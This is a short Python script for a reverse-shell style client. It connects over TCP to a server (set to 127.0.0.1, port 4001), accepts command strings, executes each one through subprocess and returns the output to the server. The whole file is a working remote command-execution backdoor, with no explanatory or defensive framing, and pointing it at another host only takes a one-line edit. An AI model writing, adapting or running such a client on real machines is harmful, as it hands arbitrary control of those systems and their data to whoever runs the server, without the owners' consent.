#!/usr/bin/python3

import socket
import subprocess

class Client():
    def __init__(self):
        self.HOST = '127.0.0.1'
        self.PORT = 4001
        self.KEEP_GOING = True
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def print_msg(self, msg):
        print(f'[*] {msg} [*]')

    def send(self, output):
        try:
            self.s.send(output.encode('utf-8'))
        except:
            self.print_msg('Failed to send data to server')
            self.KEEP_GOING = False

    def handle(self, command):
        p = subprocess.getstatusoutput(command)
        return p[1]
    
    def receive(self):
        while self.KEEP_GOING:
            try:
                data = self.s.recv(1024).decode('utf-8')

                if not data or data == 'q':
                    self.s.shutdown(1)
                    self.s.close()

                print(f'Received from server: {data}')

                output = self.handle(data)

                self.send(output)
            except:
                self.print_msg('Failed to receive data from server')
                self.KEEP_GOING = False
                exit(1)

    def main(self):
        try:
            self.s.connect((self.HOST, self.PORT))
            self.print_msg('Client started')

            while self.KEEP_GOING:
                self.receive()
        except:
            self.print_msg('Failed to connect to server')
            self.KEEP_GOING = False

if __name__ == '__main__':
    c = Client()
    c.main()

